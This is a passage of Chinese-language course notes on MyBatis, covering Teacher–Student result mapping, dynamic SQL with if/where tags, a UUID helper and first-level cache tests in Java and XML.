class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  Integer tid;</span><br><span class="line"><span class="comment">//    组合</span></span><br><span class="line">    <span class="keyword">private</span> Teacher teacher;<span class="comment">//学生关联老师</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    需求：查询所有学生信息、并显示对应老师信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String teachername;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; studentList;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>创建一个Mapper，根据老师ID获取老师信息以及老师对应的所有学生信息</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.neuedu.pojo.Teacher;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TeacherMapper</span> &#123;</span><br><span class="line"><span class="comment">//根据老师ID获取老师信息以及老师对应的所有学生信息</span></span><br><span class="line">    Teacher <span class="title function_">getTeacher</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>接着创建mapper映射文件</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--M1.按照结果集嵌套处理</span></span><br><span class="line"><span class="comment">1.从老师表和学生表查出老师ID，老师姓名，对应学生ID，对应学生姓名</span></span><br><span class="line"><span class="comment">2.对查出来的数据进行结果映射处理</span></span><br><span class="line"><span class="comment">（1）.集合 collection</span></span><br><span class="line"><span class="comment">（2）.ofType</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;teacherStudent&quot;</span> <span class="attr">type</span>=<span class="string">&quot;teacher&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;tname&quot;</span> <span class="attr">property</span>=<span class="string">&quot;teachername&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;studentList&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Student&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;sid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;sname&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;tid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;tid&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getTeacher&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;teacherStudent&quot;</span>&gt;</span></span><br><span class="line">        select  t.id tid,t.name tname,s.id sid,s.name sname</span><br><span class="line">        from teacher t,stuednt s</span><br><span class="line">        where t.id = s.tid and t.id=20240002</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 9.png)</p><p><a class="link"   href="https://www.notion.so/1212-112104560805-4-5-17ec6001e60f48a29584b1f19c6e1d2d?pvs=21" >软件1212-姜芙蓉-112104560805-作业完成4.5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;resultMap id=<span class="string">&quot;studentTeacher&quot;</span> type=<span class="string">&quot;student&quot;</span>&gt;</span><br><span class="line">        &lt;result column=<span class="string">&quot;sid&quot;</span> property=<span class="string">&quot;id&quot;</span>/&gt;</span><br><span class="line">        &lt;result column=<span class="string">&quot;sname&quot;</span> property=<span class="string">&quot;name&quot;</span>/&gt;</span><br><span class="line">        &lt;result column=<span class="string">&quot;tid&quot;</span> property=<span class="string">&quot;tid&quot;</span>/&gt;</span><br><span class="line">        &lt;association property=<span class="string">&quot;teacher&quot;</span> javaType=<span class="string">&quot;teacher&quot;</span>&gt;</span><br><span class="line">            &lt;result column=<span class="string">&quot;tid&quot;</span> property=<span class="string">&quot;id&quot;</span>/&gt;</span><br><span class="line">            &lt;result column=<span class="string">&quot;tname&quot;</span> property=<span class="string">&quot;name&quot;</span>/&gt;</span><br><span class="line">        &lt;/association&gt;</span><br><span class="line">    &lt;/resultMap&gt;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;getStudentList&quot;</span> resultMap=<span class="string">&quot;studentTeacher&quot;</span>&gt;</span><br><span class="line">        select s.id as sid,s.name as sname,s.tid tid ,t.name tname</span><br><span class="line">        from stuednt AS s,teacher as t</span><br><span class="line">        where s.tid=t.id;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure></div><h1 id="Day5-24-4-9"><a href="#Day5-24-4-9" class="headerlink" title="Day5-24.4.9"></a>Day5-24.4.9</h1><h2 id="动态SQL"><a href="#动态SQL" class="headerlink" title="动态SQL"></a>动态SQL</h2><p>通过if,choose,when,otherwise,trim, where, set, foreach等标签，组成灵活的sql语句，提高sql语句的准确性，创建一个blog数据库表</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `blog` (</span><br><span class="line">       `id` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;博客id&#x27;</span>,</span><br><span class="line">       `title` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;博客标题&#x27;</span>,</span><br><span class="line">       `author` <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;博客作者&#x27;</span>,</span><br><span class="line">       `create_time` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">       `views` <span class="type">int</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;浏览量&#x27;</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8</span><br></pre></td></tr></table></figure></div><ul><li><p>创建Mybatis基础工程</p><p>resources三个文件：db.properties <a class="link"   href="http://log4j.properties/" >log4j.properties <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> mybatis-config.xml</p><p>pom.xml的依赖加上build的静态过滤</p><p>mybatis的工具类。</p></li></ul><p>com.neuedu.untils工具类下定义一个IDUtil类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IDUtil</span> &#123;</span><br><span class="line">    <span class="comment">//生成id的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UUID.randomUUID().toString().replaceAll(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>定义Blog类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Blog</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="keyword">private</span> Integer views;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>定义BlogMapper.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.neuedu.pojo.Blog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BlogMapper</span> &#123;</span><br><span class="line">    <span class="comment">//编译接口方法</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">addBlog</span><span class="params">(Blog blog)</span>;</span><br><span class="line">    List&lt;Blog&gt; <span class="title function_">queryBlogIf</span><span class="params">(Map map)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>设置驼峰命名法与全局缓存</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--开启下划线的驼峰命名法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--开启的全局缓存--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></blockquote><p>定义BlogMapper.xml</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.neuedu.mapper.BlogMapper&quot;</span>&gt;</span><span class="comment">&lt;!--namespace 需要绑定数据访问层的接口--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;addBlog&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;blog&quot;</span>&gt;</span></span><br><span class="line">        insert into blog (id, title, author, create_time, views)</span><br><span class="line">        values (#&#123;id&#125;,#&#123;title&#125;,#&#123;author&#125;,#&#123;createTime&#125;,#&#123;views&#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryBlogIf&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;map&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;blog&quot;</span>&gt;</span></span><br><span class="line">    select * from blog</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;title != null&quot;</span>&gt;</span></span><br><span class="line">            title = #&#123;title&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;author != null&quot;</span>&gt;</span></span><br><span class="line">            and author = #&#123;author&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>MyTest.java测试类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.neuedu.mapper.BlogMapper;</span><br><span class="line"><span class="keyword">import</span> com.neuedu.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.neuedu.utils.IDUtil;</span><br><span class="line"><span class="keyword">import</span> com.neuedu.utils.MyBatisUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addBlog</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">BlogMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(BlogMapper.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Blog</span> <span class="variable">blog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Blog</span>(); <span class="comment">//实例化对象</span></span><br><span class="line">        blog.setId(IDUtil.getId());</span><br><span class="line">        blog.setTitle(<span class="string">&quot;Mybatis&quot;</span>);</span><br><span class="line">        blog.setAuthor(<span class="string">&quot;吴老师&quot;</span>);</span><br><span class="line">        blog.setCreateTime(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        blog.setViews(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        mapper.addBlog(blog);</span><br><span class="line"></span><br><span class="line">        blog.setId(IDUtil.getId());</span><br><span class="line">        blog.setTitle(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        mapper.addBlog(blog);</span><br><span class="line"></span><br><span class="line">        blog.setId(IDUtil.getId());</span><br><span class="line">        blog.setTitle(<span class="string">&quot;数据结构与算法&quot;</span>);</span><br><span class="line">        mapper.addBlog(blog);</span><br><span class="line"></span><br><span class="line">        blog.setId(IDUtil.getId());</span><br><span class="line">        blog.setTitle(<span class="string">&quot;人工智能导论&quot;</span>);</span><br><span class="line">        mapper.addBlog(blog);</span><br><span class="line"></span><br><span class="line">        sqlSession.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">queryBlogIf</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">BlogMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(BlogMapper.class);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String,String&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;title&quot;</span>,<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;author&quot;</span>,<span class="string">&quot;Teacher liu&quot;</span>);</span><br><span class="line">        List&lt;Blog&gt; blogList=mapper.queryBlogIf(map);</span><br><span class="line">        <span class="keyword">for</span> (Blog blog:blogList)&#123;</span><br><span class="line">            System.out.println(blog);</span><br><span class="line">        &#125;</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="缓存cache"><a href="#缓存cache" class="headerlink" title="缓存cache"></a>缓存cache</h2><h3 id="一级缓存"><a href="#一级缓存" class="headerlink" title="一级缓存"></a>一级缓存</h3><p>本地缓存，与数据库同一次会话期间查询到的数据放在本地缓存，相同数据无需再次查询数据库。</p><p><strong>示例</strong></p><p>定义接口UserMapper.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.neuedu.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"><span class="comment">//根据ID获取用户</span></span><br><span class="line"><span class="comment">//    @Select(&quot;select * from user where  id=#&#123;id&#125;;&quot;)</span></span><br><span class="line">    User <span class="title function_">getUserById</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>对应的xml文件</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;getUserById&quot;</span> resultType=<span class="string">&quot;com.neuedu.pojo.User&quot;</span> parameterType=<span class="string">&quot;int&quot;</span>&gt;</span><br><span class="line">     select * from user where id=#&#123;id&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure></div><p>测试用例:</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserById</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">    System.out.println(user);</span><br><span class="line"></span><br><span class="line">    <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">    System.out.println(user2);</span><br><span class="line"></span><br><span class="line">    System.out.println(user==user2);</span><br><span class="line"></span><br><span class="line">    sqlSession.close();<span class="comment">//关闭资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>会发现第二次是直接在缓存中取得数据。</p><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 10.png)</p><p>失效的情况（第二次再次查询数据库数据）</p><ul><li><p>sqlSession不同</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//创建两个sqlsession一级缓存失效</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserById02</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建两个sqlSession 一级缓存失效</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line"></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession02</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper2</span> <span class="operator">=</span> sqlSession02.getMapper(UserMapper.class);</span><br><span class="line"></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper2.getUserById(<span 